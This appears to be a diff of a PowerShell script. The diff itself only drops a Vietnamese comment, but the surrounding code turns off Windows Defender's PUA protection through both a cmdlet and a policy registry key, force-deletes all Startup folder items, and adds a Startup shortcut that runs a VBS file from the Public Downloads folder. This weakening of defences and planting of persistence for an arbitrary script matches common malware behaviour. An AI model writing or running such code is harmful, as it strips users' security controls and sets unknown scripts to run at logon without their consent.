@@ -2,7 +2,7 @@ Set-MpPreference -PUAProtection 0
 Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'PUAProtection' -Value 0
 Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\*" -Force
 $destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.vbs.lnk"
-$source = "C:\Users\Public\Downloads\Autorun.vbs"  # hoặc script bạn muốn
+$source = "C:\Users\Public\Downloads\Autorun.vbs"
 $wShell = New-Object -ComObject WScript.Shell
 $shortcut = $wShell.CreateShortcut($destination)
 $shortcut.TargetPath = $source
